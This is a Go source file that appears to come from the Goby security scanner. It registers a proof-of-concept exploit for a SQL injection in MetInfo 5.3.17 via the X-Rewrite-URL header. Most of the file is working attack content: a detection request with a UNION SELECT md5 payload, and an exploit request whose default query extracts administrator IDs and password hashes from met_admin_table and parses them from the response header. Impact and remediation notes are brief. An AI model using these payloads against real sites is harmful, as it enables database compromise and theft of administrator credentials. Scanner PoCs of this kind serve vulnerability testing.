package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Metinfo 5.3.17 X-Rewrite-URL SQLi",
    "Description": "Metinfo is a set of content management system (CMS) developed by Changsha Mituo Information Technology Co., Ltd. in China, which is developed by PHP and mysql",
    "Product": "metinfo",
    "Homepage": "https://www.metinfo.cn/",
    "DisclosureDate": "2021-06-15",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "app=\"MetInfo\"",
    "Level": "2",
    "Impact": "<p>Hackers can execute SQL statements directly, so as to control the whole server: data acquisition, data modification, data deletion, etc.</p>",
    "Recommendation": "<p>1. the data input by users should be strictly filtered in the web code.</p><p>2. deploy web application firewall to monitor database operation.</p><p>3. upgrade to the latest version.</p>",
    "References": [
        "https://www.leavesongs.com/PENETRATION/metinfo-5.3.17-sql-injection.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "union select group_concat(admin_id,0x2c,admin_pass),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from met_admin_table limit 1",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?lang=Cn&index=1",
                "follow_redirect": false,
                "header": {
                    "X-Rewrite-URL": "1/2/404xxx' union select md5(0x0c),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "58c89562f58fd276f592420068db8c09",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?lang=Cn&index=1",
                "follow_redirect": false,
                "header": {
                    "X-Rewrite-URL": "1/2/404xxx' {{{sql}}}#/index.php"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "301",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastheader|regex|(?s)list-(.*?)-Cn"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6815"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

//www.msjingmi.cn
